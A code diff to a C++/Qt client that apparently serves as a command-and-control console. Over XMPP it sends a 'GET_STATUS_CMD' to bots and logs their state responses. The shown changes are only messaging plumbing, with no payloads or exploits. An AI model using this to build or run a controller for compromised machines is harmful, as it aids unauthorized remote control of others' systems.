@@ -3,6 +3,8 @@
 #include "centralwidget.h"
 #include "connectdialog.h"
 #include "xmppclient.h"
+#include "getstatuscommand.h"
+#include "botstateresponse.h"
 #include <QAction>
 #include <QMenu>
 #include <QMenuBar>
@@ -74,6 +76,12 @@ void MainWindow::readyOnXmppClient()
     qDebug() << "Command && Control ready";
 
     setConnected(true);
+
+    Message *message = Message::createFromType("GET_STATUS_CMD");
+
+    _xmppClient -> sendCommand(*message);
+
+    delete message;
 }
 
 void MainWindow::disconnectedOnXmppClient()
@@ -81,6 +89,11 @@ void MainWindow::disconnectedOnXmppClient()
     qDebug() << "Disconnected from server";
 
     setConnected(false);
+}
+
+void MainWindow::responseReceivedOnXmppClient(const Message& response)
+{
+    qDebug() << "Response received from" << response.from();
 }
 
 void MainWindow::createWidgets()
@@ -161,6 +174,8 @@ void MainWindow::createConnections()
             this, SLOT(readyOnXmppClient()));
     connect(_xmppClient, SIGNAL(disconnected()),
             this, SLOT(disconnectedOnXmppClient()));
+    connect(_xmppClient, SIGNAL(responseReceived(const Message&)),
+            this, SLOT(responseReceivedOnXmppClient(const Message&)));
 }
 
 void MainWindow::setConnected(bool connected)
